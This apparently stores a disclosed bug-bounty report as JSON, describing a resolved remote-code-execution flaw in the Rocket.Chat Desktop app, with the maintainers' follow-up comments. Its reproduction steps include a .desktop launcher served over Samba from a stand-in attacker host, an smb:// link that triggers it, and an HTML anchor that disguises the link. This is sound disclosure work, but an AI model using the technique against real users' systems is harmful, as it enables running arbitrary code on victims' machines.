@@ -1,0 +1,382 @@
+{
+  "id": 924151,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MjQxNTE=",
+  "url": "https://hackerone.com/reports/924151",
+  "title": "Insecure use of shell.openExternal() in Rocket.Chat Desktop App leading to RCE",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-07-15T10:00:26.071Z",
+  "submitted_at": "2020-07-15T10:00:26.071Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "baltpeter",
+    "url": "/baltpeter",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/Z4xLc16fgbZUEZk5R3Spyi4t/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19858,
+    "url": "https://hackerone.com/rocket_chat",
+    "handle": "rocket_chat",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Rocket.Chat",
+      "twitter_handle": "RocketChat",
+      "website": "https://rocket.chat",
+      "about": "Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-08-01T10:17:37.113Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-07-02T10:17:30.783Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** The Rocket.Chat Desktop app passes the links users click on to Electron's `shell.openExternal()` function which can lead to remote code execution.\n\n**Description:** The filtering on the URLs passed to `shell.openExternal()` is insufficient. An attacker can craft and send a link that when clicked will cause malicious code from a remote origin to be executed on the user's system. The specific attack presented here has been tested with Xubuntu 20.04, however similar attacks are also possible on other systems, including non-Linux operating systems.\n\n## Releases Affected:\n\n  * Tested with latest release 2.17.10 from https://github.com/RocketChat/Rocket.Chat.Electron/releases\n  * Tested with latest commit `4c06582` on the `develop` branch from https://github.com/RocketChat/Rocket.Chat.Electron\n\n## Steps To Reproduce (from initial installation to vulnerability):\n\n  1. Install Rocket.Chat Desktop on Xubuntu 20.04.\n  2. Login and join a channel.\n  3. Setup a public Samba server (at `attacker.tld` in this example) and create a public share (named `public` here). In this share, publish the following file as `pwn.desktop` and make it executable:\n     \n     ```ini\n    [Desktop Entry]\n    Exec=bash -c \"(mate-calc &); xmessage \\\"Hello from Electron.\\\"\"\n    Type=Application\n     ```\n  4. From another account in the same channel, send the following message with the corresponding values replaced: `smb://attacker.tld/public/pwn.desktop`\n  5. Click the link and (if necessary) confirm starting the untrusted launcher.\n  6. Notice the calculator and message box appearing, confirming remote code execution.\n\n## Supporting Material/References:\n\n  * I have attached a video of the attack to the report.\n\n## Suggested mitigation\n\n  * The problem is in the filter for local file paths in the preload scripts that sets up the link handler here: https://github.com/RocketChat/Rocket.Chat.Electron/blob/4c06582ba3021fcf10e6230286231d50e26e2723/src/preload/links.js#L24\n  * The filter only acts as a blocklist, filtering out `file://` links. There are however plenty of other protocols depending on the system, like `smb://` as shown here. Therefore, only an allowlist can successfully prevent attacks here. Usually, allowing `http://`, `https://` and `mailto:` will be enough but you may have different requirements.\n\nBest Regards,  \nBenjamin Altpeter  \nTechnical University of Braunschweig, Germany\n\n## Impact\n\n* The attack can be triggered remotely by an attacker by simply sending a message to a channel.\n  * The particular attack presented here requires user interaction. The user has to click the link (which is not obfuscated) and potentially confirm launching the executable. The last part may not be necessary depending on the particular attack vector and system the user runs.\n  * This particular presented attack only works on certain Linux distributions. However, this is only due to the particular attack payload used (a Linux `.desktop` file accessed over Samba). Similar payloads will also work on other Linux distributions as well as Windows and macOS. The Electron documentation explicitly warns against using `shell.openExternal()` with untrusted content: https://www.electronjs.org/docs/tutorial/security#14-do-not-use-openexternal-with-untrusted-content\n  * If the attack is executed successfully, the attacker can run arbitrary code on the user's system.\n  * Patching the problem is simple and doesn't break any legitimate use cases that I can think of.",
+  "weakness": {
+    "id": 59,
+    "name": "OS Command Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 908132,
+      "file_name": "rocketchat.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bDJmgZSNjMNKZJvnyzGr3F7z?response-content-disposition=attachment%3B%20filename%3D%22rocketchat.mp4%22%3B%20filename%2A%3DUTF-8%27%27rocketchat.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5NIKTYBN%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070115Z&X-Amz-Expires=3031&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQCM2la1GSZwFkbzZwAlaXr0SDHvL7evb0H8C%2BcAyp6rJwIgUS%2FvPViGx2g0I162nhXzz0XdF2Xh43GEuLX0y03wgpgqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDNqaUM2zKa0nRrRjPiqPBY3HR7dtjU%2FqgV%2Bme1Vi2BF0srTbVHaeVx7AXFxoOny%2FWf6dy0NtyNi5jqQtZSPTNusRUoRBEVYluoE2pTzC4h8vkvORrE9JykyZYTHH8ocgk5lc0APz3GbNdw8EDi7TxEfkQrfeNcb9De%2FCYblR%2BcD3eIOuf0HhbFpNONPshVMD2bahKYX2YefU56UpZ3VXRBwPkoVPMgab%2BFva6rLt69nWaBZT3wd3EIEFt5XoYZDHjSKORRTdwTs%2FDCgqPEoyGhV0VrhBCUYqQbAukt7wGk7NrNDWs7mZmkL9Kv28fQIY1Q7h9exaudTPtQP0E2yZtr3wKCcWNQFiX57yas%2B0bvmeuA3ym%2BSzBLvdO1P9ziA8htBG3pApMoYNVRcJXqB9Ulg7ZaIeoGHU8ucHynNO64xiJkECfQ%2F83m0uusP%2FCbg8v%2FC8x09sz0WJsbCM5h90DddiMkeTK%2B47Ho2K%2FzWj9Vax4pTTeyBAgNycvbE1C5SdrAIC8ofvTBgjD9VJnS4%2Fm%2FaSERgD%2FpHxyUa3F9f2xwK2zzZHVjSUL9gImPRAlJZ6Nh8ldRy7Y8qAeEkVVgxlkabpkSUzkeJFYWeyAIFxnGiALPstIyZO91J3sBSrtYKPCa81FT%2BAe5FdP%2F16dX7M8G2QBoHlOCiborPNR188kYqbrtspQiMLdSdCqE06hDUFQ3PcbE8pZjc3H5dcny%2BqL2xr08qLnFp5WdXxcvFRdgKAOAiyBUtpuXF6qITm0ms7xwUQpzSFqpQFGxJNdqYxaBQFXFr1B8dripk5f1Qg734MxZRFa8OXrC0SUBclX%2FIsJJJqUWr7uq4q66njtMMLeKaRxJh4vXuOMKGmNrytwHC7GauHczb7gJBY9EaCQsEwyfu4qAY6sQHEE5yo4qz1nHc7W%2FmuNCkeiEC06BT2KXW5Ye7wR%2BJRqa4RD1Evl5MaAbKYOUm3j3RKv8ZiQXgBRIDsjMyLkeHJDlM30wkC5GTlhwpLfAXvVAeC%2BGlwLLBvL176VeFL7S7mGPxQhRCLoa8DCYKS9rPurVlp6T5EPeBgnNUxOC0WTs38l8ylcSgu2HURNvrOIIHuAxsNQYx%2Bnc4wcFv0RnkFptS7LlYhwcWV%2FKYEjxiy5O8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=994902976d547d45e7a1b99d918bd0f27f75ae64252e2fe4a278b7fadb8ebed6",
+      "file_size": 598549,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2022-08-01T10:17:30.861Z",
+  "allow_singular_disclosure_after": -36103425.06044099,
+  "singular_disclosure_allowed": true,
+  "vote_count": 11,
+  "voters": [
+    "tikidude",
+    "zy9ard3",
+    "yassinek3ch",
+    "renekroka",
+    "polem4rch",
+    "sirwinxwims",
+    "f_m",
+    "j0n1",
+    "shivammusic",
+    "montanahavehamsan98",
+    "and 1 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.0,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 8605375,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "To add to this: The administrator of the server can set various messages like \"Home Body\" and \"Login Terms\", including the ability to place arbitrary links. By including the following in this message, they can obfuscate the URL of the payload:\n\n```html\n<a href=\"smb://attacker.tld/public/pwn.desktop\">See our terms of service.</a>\n```",
+      "automated_response": false,
+      "created_at": "2020-07-15T10:11:42.048Z",
+      "updated_at": "2020-07-15T10:13:01.100Z",
+      "actor": {
+        "username": "baltpeter",
+        "cleared": false,
+        "verified": false,
+        "url": "/baltpeter",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/Z4xLc16fgbZUEZk5R3Spyi4t/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rocket_chat"
+    },
+    {
+      "id": 8609931,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Hi @baltpeter \n\nthank you very much for reporting this and the many details. I will bring this to the team and discuss the mitigation options, keeping you posted here.\n\nBest\nMarkus",
+      "automated_response": false,
+      "created_at": "2020-07-15T16:30:03.287Z",
+      "updated_at": "2020-07-15T16:30:03.287Z",
+      "actor": {
+        "username": "markus-rocketchat",
+        "cleared": false,
+        "verified": false,
+        "url": "/markus-rocketchat",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rocket_chat"
+    },
+    {
+      "id": 9073977,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @markus-rocketchat,\n\nany updates on this?\n\nBest Regards,\nBenjamin",
+      "automated_response": false,
+      "created_at": "2020-08-29T14:28:39.024Z",
+      "updated_at": "2020-08-29T14:28:39.024Z",
+      "actor": {
+        "username": "baltpeter",
+        "cleared": false,
+        "verified": false,
+        "url": "/baltpeter",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/Z4xLc16fgbZUEZk5R3Spyi4t/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rocket_chat"
+    },
+    {
+      "id": 9078018,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @baltpeter \n\nsorry for the silence. Your report is on our task list. \n\nSo we are planning some updates for the desktop app in the weeks to come, also adressing this. But we have to do some larger changes in general, this is why it is taking a bit longer than expected.\n\nThank you for your patience. I hope to share some news soon.\n\nBest\nMarkus",
+      "automated_response": false,
+      "created_at": "2020-08-30T14:39:39.016Z",
+      "updated_at": "2020-08-30T14:39:39.016Z",
+      "actor": {
+        "username": "markus-rocketchat",
+        "cleared": false,
+        "verified": false,
+        "url": "/markus-rocketchat",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rocket_chat"
+    },
+    {
+      "id": 9296369,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @baltpeter \n\njust a quick follow-up: we have a solution upcoming, that requires users to accept opening \"exotic\" protocols like smb, rather than opening them right away\nwe are currently testing it and it should arrive soon\n\nBest\nMarkus",
+      "automated_response": false,
+      "created_at": "2020-09-22T17:07:48.783Z",
+      "updated_at": "2020-09-22T17:07:48.783Z",
+      "actor": {
+        "username": "markus-rocketchat",
+        "cleared": false,
+        "verified": false,
+        "url": "/markus-rocketchat",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rocket_chat"
+    },
+    {
+      "id": 9298409,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @markus-rocketchat,\n\nthat sounds good. Thanks for the update!\n\nBest Regards,\nBenjamin",
+      "automated_response": false,
+      "created_at": "2020-09-22T19:00:17.735Z",
+      "updated_at": "2020-09-22T19:00:17.735Z",
+      "actor": {
+        "username": "baltpeter",
+        "cleared": false,
+        "verified": false,
+        "url": "/baltpeter",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/Z4xLc16fgbZUEZk5R3Spyi4t/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rocket_chat"
+    },
+    {
+      "id": 9989888,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @baltpeter \n\nanother update from our side: we recently merged an attempt for a fix but got another report in with some additional mitigation advice. So before closing this one, me and the team would like to reconsider our existing solution in light of the recent feedback.\n\nWill keep you posted.",
+      "automated_response": false,
+      "created_at": "2020-12-03T00:27:49.485Z",
+      "updated_at": "2020-12-03T00:27:49.485Z",
+      "actor": {
+        "username": "markus-rocketchat",
+        "cleared": false,
+        "verified": false,
+        "url": "/markus-rocketchat",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rocket_chat"
+    },
+    {
+      "id": 14947489,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Hi @baltpeter,\n\nWe fixed this vulnerability as you can see in the following PR. I'll proceed and close this report\nThanks for your work.\n\nhttps://github.com/RocketChat/Rocket.Chat.Electron/pull/1710\nhttps://github.com/RocketChat/Rocket.Chat.Electron/pull/1709",
+      "automated_response": false,
+      "created_at": "2022-01-07T19:26:52.283Z",
+      "updated_at": "2022-01-07T19:26:52.283Z",
+      "actor": {
+        "username": "lucas_magno",
+        "cleared": false,
+        "verified": false,
+        "url": "/lucas_magno",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "baltpeter",
+        "url": "/baltpeter"
+      },
+      "genius_execution_id": null,
+      "team_handle": "rocket_chat"
+    },
+    {
+      "id": 17387303,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-07-02T10:17:30.818Z",
+      "updated_at": "2022-07-02T10:17:30.818Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "baltpeter",
+        "cleared": false,
+        "verified": false,
+        "url": "/baltpeter",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/Z4xLc16fgbZUEZk5R3Spyi4t/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rocket_chat"
+    },
+    {
+      "id": 17796489,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-08-01T10:17:37.404Z",
+      "updated_at": "2022-08-01T10:17:37.404Z",
+      "actor": {
+        "url": "/rocket_chat",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Rocket.Chat"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "rocket_chat"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
